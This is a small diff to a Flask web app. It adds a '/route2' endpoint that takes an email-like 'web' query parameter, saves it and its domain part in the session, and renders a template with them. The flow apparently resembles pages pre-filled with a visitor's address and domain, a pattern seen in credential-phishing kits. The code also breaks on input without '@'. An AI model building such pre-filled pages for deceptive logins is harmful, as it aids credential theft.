@@ -138,6 +138,14 @@ def success():
     web_param = request.args.get('web', 'No web param')
     return redirect(url_for('route2', web=web_param))
 
+@app.route("/route2")
+def route2():
+    web_param = request.args.get('web')
+    if web_param:
+        session['eman'] = web_param
+        session['ins'] = web_param[web_param.index('@') + 1:]
+    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+
 
 @app.route('/first', methods=['POST'])
 def first():
